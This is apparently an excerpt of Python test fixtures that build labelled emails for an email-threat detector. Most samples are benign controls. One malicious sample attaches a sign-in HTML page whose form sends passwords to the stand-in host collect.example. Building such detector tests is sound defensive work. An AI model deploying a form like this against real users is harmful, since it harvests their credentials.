...
def message(subject, body="The requested report is attached. Kind regards.", attachments=(), reply_to=None):
    headers = [("From", "Reports <reports@vendor-news.com>"), ("To", "Alice <alice@interne.fr>"),
               ("Subject", subject), ("Date", "Sat, 5 Sep 2026 10:00:00 +0000"), ("Message-ID", "<calibration@vendor-news.com>"),
               ("Received", "from mail.vendor-news.com ([93.184.216.34]) by mx.interne.fr; Sat, 5 Sep 2026 10:00:01 +0000"),
               ("Authentication-Results", "mx.interne.fr; spf=pass smtp.mailfrom=vendor-news.com; dkim=pass header.d=vendor-news.com; dmarc=pass header.from=vendor-news.com")]
    if reply_to:
...
def examples():
    ...
    controls = [
        ...
        ("bank_notice", "benign", message("New bank details", "Following our bank merger, here are our new bank details. Verify using your usual contact number.")),
        ("invoice_replyto", "benign", message("Invoice", "Here is the invoice for work completed last month.", reply_to="Accounts <accounts-example@gmail.com>")),
        ...
        ("credential_harvest", "malicious", message("Requested document", attachments=[RawAttachment("signin.html", b'<html><body><form action="https://collect.example/submit"><input type="password" name="password"><button>Continue</button></form></body></html>')])),
    ]
